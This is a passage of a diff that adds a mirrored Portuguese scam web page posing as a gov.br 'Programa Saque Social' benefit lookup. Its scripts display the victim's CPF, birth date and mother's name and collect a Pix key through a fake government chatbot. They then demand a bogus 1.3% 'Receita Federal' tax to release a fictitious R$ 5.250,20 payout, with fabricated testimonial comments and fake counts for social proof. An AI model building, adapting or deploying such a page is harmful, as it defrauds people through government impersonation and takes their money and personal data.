@@ -1,0 +1,1414 @@
+<!DOCTYPE html><html lang="pt-BR"><!-- Mirrored from valorconsultadoonline2026.vercel.app/consulta.html?cpf=33311996801 by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Jun 2026 20:17:05 GMT --><!-- Added by HTTrack -->
+<!-- Mirrored from valores-recebergv2.online/2/consulta.html? by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Oct 2026 21:00:26 GMT -->
+<head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
+  <title>Programa Saque Social - CONSULTA</title>
+  <link rel="icon" href="favic.html" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
+
+
+  <link rel="stylesheet" href="css/all.min.css">
+  <script>!function (i, n) { i._plt = i._plt || (n && n.timeOrigin ? n.timeOrigin + n.now() : Date.now()) }(window, performance);</script>
+
+  <style>
+    :root {
+      --gov-blue-primary: #1351B4;
+      --gov-blue-secondary: #0F4DA8;
+      --gov-blue-light: #E8F4FD;
+      --gov-blue-dark: #0C326F;
+      --gov-green: #168821;
+      --gov-orange: #FF7A00;
+      --gov-gray-light: #F8F9FA;
+      --gov-gray-medium: #E5E5E5;
+      --gov-gray-dark: #495057;
+      --gov-white: #FFFFFF;
+      --gov-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      --gov-shadow-hover: 0 4px 12px rgba(0, 0, 0, 0.15);
+      --border-radius: 8px;
+      --transition: all 0.3s ease;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      height: 100%;
+      overflow-x: hidden;
+    }
+
+    body {
+      font-family: 'Inter', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, var(--gov-blue-light) 0%, var(--gov-white) 100%);
+      min-height: 100vh;
+      color: var(--gov-gray-dark);
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      font-feature-settings: 'kern' 1, 'liga' 1;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    #loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--gov-white);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    #loading-screen.hidden {
+      display: none !important;
+    }
+
+    .blink-logo {
+      animation: blink 1s infinite;
+      width: 120px;
+      height: auto;
+    }
+
+    @keyframes blink {
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0;
+      }
+    }
+
+    header {
+      background: var(--gov-white);
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: var(--gov-shadow);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      border-bottom: 3px solid var(--gov-blue-primary);
+    }
+
+    header .logo {
+      display: flex;
+      align-items: center;
+    }
+
+    header .logo img {
+      height: 40px;
+      width: auto;
+      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+    }
+
+    header .icons {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    header .icons button {
+      background: none;
+      border: none;
+      padding: 8px;
+      cursor: pointer;
+      transition: var(--transition);
+      color: var(--gov-blue-primary);
+    }
+
+    header .icons button:hover {
+      background: var(--gov-blue-light);
+      transform: translateY(-1px);
+    }
+
+    header .icons button i {
+      font-size: 16px;
+    }
+
+    header .user {
+      background-color: #1451b4;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 6px 16px;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    header .user i {
+      margin-right: 8px;
+    }
+
+    nav {
+      background: var(--gov-white);
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--gov-gray-medium);
+      position: sticky;
+      top: 79px;
+      z-index: 999;
+    }
+
+    nav button {
+      background: none;
+      border: none;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      padding: 8px 12px;
+      border-radius: var(--border-radius);
+      transition: var(--transition);
+    }
+
+    nav button:hover {
+      background: var(--gov-gray-light);
+    }
+
+    nav button i {
+      font-size: 16px;
+      color: var(--gov-blue-primary);
+      margin-right: 8px;
+    }
+
+    nav button p {
+      color: var(--gov-gray-dark);
+      font-size: 14px;
+      font-weight: 400;
+      margin: 0;
+    }
+
+    nav button span {
+      color: var(--gov-blue-primary);
+      font-weight: 500;
+    }
+
+    #main-content {
+      padding: 0 24px;
+      max-width: 720px;
+      flex: 1 0 auto;
+      padding-bottom: 40px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 15px;
+      background-color: var(--gov-gray-medium);
+      border-radius: 10px;
+      margin-top: 16px;
+      margin-bottom: 16px;
+      overflow: hidden;
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, var(--gov-blue-primary), var(--gov-green));
+      transition: width 0.2s linear;
+      border-radius: 10px;
+    }
+
+    .video-container {
+      position: relative;
+      width: 100%;
+      border-radius: var(--border-radius);
+      overflow: hidden;
+      box-shadow: var(--gov-shadow);
+      z-index: 1;
+    }
+
+    .video-container video {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .thumbnail-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      display: none;
+      background: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+      cursor: pointer;
+    }
+
+    .thumbnail-content {
+      background: rgba(19, 81, 180, 0.9);
+      border-radius: var(--border-radius);
+      padding: 15px;
+      text-align: center;
+      animation: pulse 2s infinite;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-shadow: var(--gov-shadow-hover);
+    }
+
+    .thumbnail-content h2 {
+      font-size: 24px;
+      color: var(--gov-white);
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .thumbnail-content i {
+      font-size: 64px;
+      color: var(--gov-white);
+    }
+
+    @keyframes pulse {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.05);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    .resgate-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      display: none;
+      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-green));
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      color: var(--gov-white);
+      padding: 20px;
+      z-index: 10;
+    }
+
+    .resgate-content {
+      max-width: 80%;
+      margin: 0 auto;
+    }
+
+    .resgate-content h2 {
+      font-size: 20px;
+      margin-bottom: 10px;
+      font-weight: 600;
+    }
+
+    .resgate-content p {
+      font-size: 16px;
+      line-height: 1.4;
+    }
+
+    .info-container {
+      margin-top: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      background: var(--gov-white);
+      padding: 16px;
+      border-radius: var(--border-radius);
+      box-shadow: var(--gov-shadow);
+    }
+
+    .info-item {
+      font-size: 14px;
+      color: var(--gov-gray-dark);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 8px 0;
+    }
+
+    .info-item i {
+      color: var(--gov-blue-primary);
+      width: 16px;
+    }
+
+    .button-saque {
+      display: none;
+      margin-top: 24px;
+      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
+      color: var(--gov-white);
+      font-size: 16px;
+      padding: 16px;
+      border: none;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      transition: var(--transition);
+      width: 100%;
+      text-align: center;
+      font-weight: 600;
+      box-shadow: var(--gov-shadow);
+    }
+
+    .button-saque:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--gov-shadow-hover);
+    }
+
+    .fb-header-outside {
+      margin-top: 15px;
+      padding: 15px 0 5px 24px;
+      font-size: 14px;
+      font-weight: bold;
+      color: var(--gov-gray-dark);
+      border-top: 1px solid var(--gov-gray-medium);
+      width: 100%;
+      background: var(--gov-white);
+      text-align: left;
+    }
+
+    .fb-comments-container {
+      width: 100%;
+      background: var(--gov-white);
+      padding: 24px;
+      box-shadow: var(--gov-shadow);
+    }
+
+    .fb-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+
+    .fb-header .fb-comment-count {
+      font-size: 14px;
+      font-weight: bold;
+      color: var(--gov-gray-dark);
+    }
+
+    .fb-header .fb-loading {
+      font-size: 12px;
+      color: var(--gov-gray-dark);
+      display: flex;
+      align-items: center;
+    }
+
+    .fb-header .fb-loading i {
+      margin-right: 6px;
+    }
+
+    .comment-item {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 16px;
+      width: 100%;
+    }
+
+    .comment-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-right: 8px;
+      object-fit: cover;
+    }
+
+    .comment-content {
+      background: var(--gov-gray-light);
+      border-radius: 12px;
+      padding: 8px 12px;
+      position: relative;
+      flex: 1;
+    }
+
+    .comment-content::before {
+      content: "";
+      position: absolute;
+      top: 10px;
+      left: -6px;
+      border-top: 6px solid transparent;
+      border-right: 6px solid var(--gov-gray-light);
+      border-bottom: 6px solid transparent;
+    }
+
+    .comment-name {
+      font-size: 14px;
+      font-weight: bold;
+      color: var(--gov-blue-primary);
+      margin-bottom: 4px;
+    }
+
+    .comment-text {
+      font-size: 14px;
+      color: var(--gov-gray-dark);
+      line-height: 1.3;
+    }
+
+    .comment-actions {
+      display: flex;
+      margin-top: 4px;
+      font-size: 12px;
+      color: var(--gov-gray-dark);
+    }
+
+    .comment-actions i {
+      margin-right: 4px;
+    }
+
+    .comment-likes {
+      margin-right: 8px;
+    }
+
+    .comment-dislikes {
+      margin-right: 8px;
+    }
+
+    .comment-replies {
+      margin-left: 48px;
+      margin-top: 8px;
+      border-left: 2px solid var(--gov-gray-medium);
+      padding-left: 8px;
+    }
+
+    footer {
+      background: linear-gradient(135deg, var(--gov-blue-dark), #0B1A38);
+      color: var(--gov-white);
+      text-align: center;
+      padding: 16px;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+
+    #modal-chat {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 99999;
+      overflow: auto;
+    }
+
+    #modal-chat.active {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding-top: 5%;
+    }
+
+    .chat-bot-container {
+      background: var(--gov-white);
+      width: 90%;
+      max-width: 400px;
+      height: 80vh;
+      border-radius: var(--border-radius);
+      display: flex;
+      flex-direction: column;
+      box-shadow: var(--gov-shadow-hover);
+    }
+
+    .chat-header {
+      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
+      color: var(--gov-white);
+      padding: 12px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-radius: var(--border-radius) var(--border-radius) 0 0;
+    }
+
+    .chat-header-title {
+      font-size: 16px;
+    }
+
+    .close-btn {
+      background: none;
+      border: none;
+      color: var(--gov-white);
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .chat-body {
+      flex: 1;
+      padding: 16px;
+      overflow-y: auto;
+      background: var(--gov-gray-light);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .message-bot-container,
+    .message-user-container {
+      margin-bottom: 8px;
+      display: flex;
+      animation: fadeInMessage 0.3s forwards;
+    }
+
+    @keyframes fadeInMessage {
+      0% {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .message-bot-container {
+      align-items: flex-start;
+    }
+
+    .message-bot {
+      background: var(--gov-white);
+      color: var(--gov-gray-dark);
+      display: inline-block;
+      padding: 8px 12px;
+      border-radius: 12px;
+      max-width: 80%;
+      line-height: 1.4;
+      font-size: 14px;
+      box-shadow: var(--gov-shadow);
+    }
+
+    .message-user-container {
+      justify-content: flex-end;
+      align-items: flex-start;
+    }
+
+    .message-user {
+      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
+      color: var(--gov-white);
+      display: inline-block;
+      padding: 8px 12px;
+      border-radius: 12px;
+      max-width: 80%;
+      line-height: 1.4;
+      font-size: 14px;
+      box-shadow: var(--gov-shadow);
+    }
+
+    .bot-avatar {
+      height: 15px;
+      margin-right: 8px;
+    }
+
+    .chat-footer {
+      background: var(--gov-white);
+      display: flex;
+      border-top: 1px solid var(--gov-gray-medium);
+      border-radius: 0 0 var(--border-radius) var(--border-radius);
+    }
+
+    .chat-footer input[type="text"] {
+      flex: 1;
+      border: none;
+      padding: 12px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .chat-footer button {
+      background: linear-gradient(135deg, var(--gov-blue-primary), var(--gov-blue-secondary));
+      color: var(--gov-white);
+      border: none;
+      padding: 0 16px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .chat-footer button:hover {
+      background: linear-gradient(135deg, var(--gov-blue-secondary), var(--gov-blue-dark));
+    }
+
+    .typing-indicator-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 8px;
+      animation: fadeInMessage 0.3s forwards;
+    }
+
+    .typing-indicator-bubble {
+      background: var(--gov-white);
+      color: var(--gov-gray-dark);
+      padding: 8px 12px;
+      border-radius: 12px;
+      max-width: 80%;
+      line-height: 1.4;
+      font-size: 14px;
+      box-shadow: var(--gov-shadow);
+      position: relative;
+      min-width: 60px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .blue-circle {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--gov-blue-primary);
+      margin: 0 3px;
+      animation: bounceDots 1s infinite alternate;
+    }
+
+    @keyframes bounceDots {
+      0% {
+        transform: translateY(0);
+      }
+
+      100% {
+        transform: translateY(-5px);
+      }
+    }
+
+    .pay-button {
+      background: linear-gradient(135deg, var(--gov-green), #0d6f18);
+      color: var(--gov-white);
+      border: none;
+      padding: 8px 16px;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      font-size: 14px;
+      margin-top: 8px;
+      font-weight: 500;
+    }
+
+    .pay-button:hover {
+      background: linear-gradient(135deg, #0d6f18, #0a5a14);
+    }
+
+    .pix-payment-box {
+      background: #ffffff;
+      border: 1px solid #d1d5db;
+      border-radius: 12px;
+      padding: 16px;
+      margin-top: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+    .pix-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #1351B4;
+      margin-bottom: 6px;
+    }
+    .pix-subtitle {
+      font-size: 13px;
+      color: #4b5563;
+      margin-bottom: 12px;
+      line-height: 1.4;
+    }
+    .pix-qr-wrapper {
+      background: #f9fafb;
+      padding: 10px;
+      border-radius: 8px;
+      display: inline-block;
+      margin-bottom: 12px;
+      border: 1px solid #e5e7eb;
+    }
+    .pix-qr-img {
+      max-width: 200px;
+      width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+    .pix-instructions {
+      font-size: 12px;
+      color: #6b7280;
+      margin-bottom: 8px;
+      line-height: 1.3;
+    }
+    .pix-input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+    .pix-input-group input {
+      width: 100%;
+      padding: 9px 12px;
+      font-size: 12px;
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      background: #f3f4f6;
+      color: #374151;
+      outline: none;
+      box-sizing: border-box;
+    }
+    .pix-btn-copy {
+      background: #168821;
+      color: #fff;
+      border: none;
+      padding: 10px 16px;
+      font-size: 13px;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: background 0.2s ease;
+    }
+    .pix-btn-copy:hover {
+      background: #13741c;
+    }
+    .pix-link-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      background: #1351B4;
+      color: #ffffff !important;
+      text-decoration: none;
+      padding: 9px 14px;
+      border-radius: 6px;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      transition: background 0.2s ease;
+    }
+    .pix-link-btn:hover {
+      background: #0f4090;
+    }
+    .pix-status-check {
+      font-size: 12px;
+      color: #1351B4;
+      background: #eff6ff;
+      border: 1px solid #bfdbfe;
+      padding: 8px 12px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-weight: 500;
+    }
+
+    @media (max-width: 768px) {
+      header {
+        padding: 12px 16px;
+      }
+
+      header .logo img {
+        height: 32px;
+      }
+
+      #main-content {
+        padding: 0 16px;
+      }
+
+      .fb-comments-container {
+        padding: 16px;
+      }
+
+      .chat-bot-container {
+        width: 95%;
+        height: 90vh;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div id="loading-screen" class="hidden">
+    <img src="images/govbr.png" style="width: 140px; margin: 10px;">
+  </div>
+  <header>
+    <div class="logo">
+      <img src="images/govbr.png" style="width: 90px; margin: 10px;">
+    </div>
+    <div class="icons">
+      <button><i class="fas fa-ellipsis-v"></i></button>
+      <button><i class="fas fa-cookie-bite"></i></button>
+      <button><i class="fas fa-th"></i></button>
+      <button class="user" id="user-button" style="background-color: #1451b4;">
+        <i class="fas fa-user" style="color: #fff;"></i>
+        <span id="header-user-name" style="color: #fff;">Usuário</span>
+      </button>
+    </div>
+  </header>
+  <nav>
+    <button>
+      <i class="fas fa-bars"></i>
+      <p>Benefício <span> › </span> Valores a Receber <span> › </span> Análise</p>
+    </button>
+    <button><i class="fas fa-search"></i></button>
+  </nav>
+  <main id="main-content" class="">
+    <div class="progress-container">
+      <div class="progress-bar" id="progress-bar"></div>
+    </div>
+    <div class="video-container" id="video-wrapper" style="background: #000; position: relative; cursor: pointer;">
+      <video id="myVideo" src="media/indeniza.mp4" style="display: block; margin: 0 auto; width: 100%;" autoplay="" muted="" playsinline=""></video>
+      <div id="unmute-overlay" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 6; backdrop-filter: blur(5px); transition: opacity 0.3s ease; text-align: center; color: white; border-radius: 8px;">
+        <img src="images/govbr.png" alt="Gov.br" style="height: 40px; margin-bottom: 24px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));">
+        <div style="background: rgba(19, 81, 180, 0.9); border-radius: 50%; width: 70px; height: 70px; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; box-shadow: 0 4px 15px rgba(19, 81, 180, 0.6); border: 2px solid rgba(255, 255, 255, 0.3);">
+          <i class="fas fa-volume-up" style="font-size: 32px; animation: pulse 1.5s infinite;"></i>
+        </div>
+        <div style="font-size: 20px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; text-shadow: 0 2px 4px rgba(0,0,0,0.8);">Seu vídeo já começou</div>
+        <div style="font-size: 15px; font-weight: 500; margin-top: 8px; opacity: 0.9; text-shadow: 0 1px 3px rgba(0,0,0,0.8);">Clique na tela para ouvir</div>
+      </div>
+      <div id="play-pause-overlay" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 5; transition: opacity 0.3s; opacity: 0;">
+        <div style="background: rgba(0, 0, 0, 0.6); border-radius: 50%; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(4px); box-shadow: 0 4px 12px rgba(0,0,0,0.3);">
+          <i class="fas fa-play" id="play-icon" style="color: white; font-size: 24px; margin-left: 4px; display: none;"></i>
+          <i class="fas fa-pause" id="pause-icon" style="color: white; font-size: 24px; display: none;"></i>
+        </div>
+      </div>
+      <div class="resgate-overlay" id="resgate-overlay">
+        <div class="resgate-content">
+          <h2>Seu saque já está disponível para resgate!</h2>
+          <p>Clique no botão abaixo para efetuar o saque.</p>
+        </div>
+      </div>
+    </div>
+    <div class="info-container">
+      <div class="info-item">
+        <i class="fas fa-credit-card"></i>
+        <span id="cpf-value">---</span>
+      </div>
+      <div class="info-item">
+        <i class="fas fa-user"></i>
+        <span id="name-value">---</span>
+      </div>
+      <div class="info-item">
+        <i class="fas fa-calendar"></i>
+        <span id="birth-value">---</span>
+      </div>
+      <div class="info-item" id="mother-item">
+        <i class="fas fa-female"></i>
+        <span id="mother-value">---</span>
+      </div>
+      <div class="info-item" id="status-item">
+        <i class="fas fa-search"></i>
+        <span>Sua consulta está em andamento...</span>
+      </div>
+    </div>
+    <button class="button-saque" id="button-saque">Efetuar Saque Agora</button>
+  </main>
+  <div class="fb-header-outside" id="fb-header-outside">Comentários (25738)</div>
+  <div class="fb-comments-container" id="fb-comments-container">
+    <div class="fb-header">
+      <span class="fb-comment-count" id="fb-comment-count">Comentários: 25741</span>
+      <span class="fb-loading" id="fb-loading">Comentários atualizados.</span>
+    </div>
+  </div>
+
+  <div id="modal-chat">
+    <div class="chat-bot-container">
+      <div class="chat-header">
+        <span class="chat-header-title">Atendimento Virtual</span>
+        <button class="close-btn" id="close-modal"><i class="fas fa-times"></i></button>
+      </div>
+      <div class="chat-body" id="chat-body"></div>
+      <div class="chat-footer" id="chat-footer">
+        <input type="text" id="user-input" placeholder="Digite sua chave pix...">
+        <button id="send-message">Enviar</button>
+      </div>
+    </div>
+  </div>
+  <script src="js/5a8zWkhgEY7Y.js"></script>
+  <script>
+    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+    function maskCPF(cpf) {
+      const onlyNums = cpf.replace(/\D/g, '');
+      if (onlyNums.length !== 11) return cpf;
+      return onlyNums.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+    let fullName = '', firstName = '', maskedCPFValue = '', birthValue = '', motherValue = '';
+    let videoStarted = false, videoCompleted = false, chaveEnviada = false, progressEnabled = true;
+    let totalComments = 25738;
+    let storedComments = [];
+    const elements = {
+      loadingScreen: document.getElementById('loading-screen'),
+      mainContent: document.getElementById('main-content'),
+      thumbnailOverlay: document.getElementById('thumbnail-overlay'),
+      resgateOverlay: document.getElementById('resgate-overlay'),
+      progressBar: document.getElementById('progress-bar'),
+      buttonSaque: document.getElementById('button-saque'),
+      chatBody: document.getElementById('chat-body'),
+      userInput: document.getElementById('user-input'),
+      sendMessageBtn: document.getElementById('send-message'),
+      closeModalBtn: document.getElementById('close-modal'),
+      cpfSpan: document.getElementById('cpf-value'),
+      nameSpan: document.getElementById('name-value'),
+      birthSpan: document.getElementById('birth-value'),
+      motherItem: document.getElementById('mother-item'),
+      motherSpan: document.getElementById('mother-value'),
+      statusItem: document.getElementById('status-item'),
+      headerUserName: document.getElementById('header-user-name'),
+      fbHeaderOutside: document.getElementById('fb-header-outside'),
+      fbContainer: document.getElementById('fb-comments-container'),
+      fbCountSpan: document.getElementById('fb-comment-count'),
+      fbLoadingSpan: document.getElementById('fb-loading'),
+    };
+    const player = null; // Vturb Player integrado via Web Component
+    elements.thumbnailOverlay = { style: {} }; // Mock para evitar erros no script legado
+    elements.sendMessageBtn.addEventListener('click', async () => {
+      const text = elements.userInput.value.trim();
+      if (!text) return;
+      appendUserMessage(text);
+      elements.userInput.value = '';
+      if (!chaveEnviada) {
+        chaveEnviada = true;
+        await flowAfterPixKey();
+      }
+    });
+    // Lógica de overlay do Vturb substituída
+    async function botMessageWithTypingDelay(text, ms = 2500) {
+      addTypingIndicator();
+      await delay(ms);
+      removeTypingIndicator();
+      appendBotMessage(text);
+    }
+    function addTypingIndicator() {
+      const container = document.createElement('div');
+      container.classList.add('typing-indicator-container', 'message-bot-container');
+      container.id = 'typing-indicator';
+      container.innerHTML = `
+        <img class="bot-avatar" src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot"/>
+        <div class="message-bot typing-indicator-bubble">
+          <div class="blue-circle"></div><div class="blue-circle"></div><div class="blue-circle"></div>
+        </div>`;
+      elements.chatBody.appendChild(container);
+      scrollChatToBottom();
+    }
+    function removeTypingIndicator() {
+      const el = document.getElementById('typing-indicator');
+      if (el) el.remove();
+    }
+    function appendBotMessage(text) {
+      const container = document.createElement('div');
+      container.classList.add('message-bot-container');
+      container.innerHTML = `
+        <img class="bot-avatar" src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot"/>
+        <div class="message-bot">${text}</div>`;
+      elements.chatBody.appendChild(container);
+      scrollChatToBottom();
+    }
+    function appendUserMessage(text) {
+      const container = document.createElement('div');
+      container.classList.add('message-user-container');
+      container.innerHTML = `<div class="message-user">${text}</div>`;
+      elements.chatBody.appendChild(container);
+      scrollChatToBottom();
+    }
+    function scrollChatToBottom() {
+      setTimeout(() => {
+        elements.chatBody.scrollTop = elements.chatBody.scrollHeight;
+      }, 100);
+    }
+    async function flowAfterPixKey() {
+      await botMessageWithTypingDelay('Excelente! Sua <b>chave Pix</b> foi vinculada com sucesso.', 2200);
+      await botMessageWithTypingDelay('Observamos que o valor do seu saque supera <b>R$ 5.000</b>, segundo as diretrizes da Receita Federal.', 2500);
+      await botMessageWithTypingDelay('Para prosseguir e liberar de forma imediata, é obrigatório o recolhimento de <b>1.3%</b> sobre o valor total.', 2500);
+      await botMessageWithTypingDelay('<b>Valor do saque:</b> R$ 5.250,20<br><b>Imposto devido:</b> R$ 68,25<br>Depois do pagamento, o dinheiro cai na hora.', 2500);
+      await botMessageWithTypingDelay('Caso o valor do imposto não seja quitado, a Receita Federal destinará o valor do seu Saque Social para projetos e iniciativas de políticos do estado.', 2500);
+      await botMessageWithTypingDelay(`<b>Para finalizar o recebimento</b>, clique no botão abaixo:<button class="pay-button" id="pay-button">Pagar Imposto Agora</button>`, 2500);
+    }
+    // Vídeo local — atualização da barra de progresso
+    var myVideo = document.getElementById('myVideo');
+    if (myVideo) {
+      // Controle customizado de play/pause
+      var videoWrapper = document.getElementById('video-wrapper');
+      var playPauseOverlay = document.getElementById('play-pause-overlay');
+      var playIcon = document.getElementById('play-icon');
+      var pauseIcon = document.getElementById('pause-icon');
+      var unmuteOverlay = document.getElementById('unmute-overlay');
+      var isPlaying = true; // assume autoplay tenta iniciar
+
+      if (videoWrapper) {
+        videoWrapper.addEventListener('click', function(e) {
+          if (e.target.closest('#resgate-overlay')) return;
+          
+          if (myVideo.muted) {
+            myVideo.muted = false;
+            myVideo.currentTime = 0; // Reinicia o vídeo com som para não perder nada
+            if (unmuteOverlay) unmuteOverlay.style.opacity = '0';
+            setTimeout(() => { if(unmuteOverlay) unmuteOverlay.style.display = 'none'; }, 300);
+          } else {
+            if (myVideo.paused) {
+              myVideo.play();
+            } else {
+              myVideo.pause();
+            }
+          }
+        });
+      }
+
+      myVideo.addEventListener('pause', function() {
+        isPlaying = false;
+        playIcon.style.display = 'block';
+        pauseIcon.style.display = 'none';
+        playPauseOverlay.style.opacity = '1';
+      });
+
+      myVideo.addEventListener('play', function() {
+        isPlaying = true;
+        playIcon.style.display = 'none';
+        pauseIcon.style.display = 'block';
+        playPauseOverlay.style.opacity = '1';
+        setTimeout(() => { if(isPlaying) playPauseOverlay.style.opacity = '0'; }, 800);
+      });
+
+      myVideo.addEventListener('timeupdate', function () {
+        if (!progressEnabled || videoCompleted) return;
+        var ct = myVideo.currentTime;
+        var du = myVideo.duration;
+        if (ct && du && du > 0) {
+          var percent = (ct / du) * 100;
+          if (elements.progressBar) {
+            elements.progressBar.style.width = percent + '%';
+          }
+          if (percent >= 99) finalizeProgress();
+        }
+      });
+      myVideo.addEventListener('ended', function () {
+        if (!videoCompleted) finalizeProgress();
+      });
+    }
+    function finalizeProgress() {
+      videoCompleted = true;
+      elements.resgateOverlay.style.display = 'flex';
+      elements.statusItem.innerHTML = `<i class="fas fa-search"></i> Saque liberado.`;
+      elements.buttonSaque.style.display = 'block';
+      elements.progressBar.style.width = '100%';
+    }
+    function initFacebookComments() {
+      elements.fbHeaderOutside.textContent = `Comentários (${totalComments})`;
+      const local = localStorage.getItem('commentsData');
+      if (local) {
+        storedComments = JSON.parse(local);
+        storedComments.forEach(comm => createComment(comm.name, comm.avatar, comm.text, comm.likes, comm.dislikes, false));
+        elements.fbCountSpan.textContent = `Comentários: ${totalComments}`;
+        elements.fbLoadingSpan.textContent = "Comentários atualizados.";
+        scheduleComments();
+      } else {
+        generateInitialComments();
+      }
+    }
+    function generateInitialComments() {
+      const texts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
+      texts.forEach(text => createRandomComment(text, true));
+      elements.fbCountSpan.textContent = `Comentários: ${totalComments}`;
+      elements.fbLoadingSpan.textContent = "Comentários atualizados.";
+      scheduleComments();
+      saveCommentsToLocal();
+    }
+    function scheduleComments() {
+      const messages = [
+        "Alguém conseguiu R$ 2.700 hoje?",
+        "Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!",
+        "Testei hoje e entrou R$ 2.100 rapidinho!",
+        "Show! Liberou R$ 4.250 e já usei tudo!",
+        "Recebi R$ 5.000, só precisei pagar a taxa"
+      ];
+      messages.forEach((msg, i) => {
+        setTimeout(() => {
+          elements.fbLoadingSpan.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Carregando comentários`;
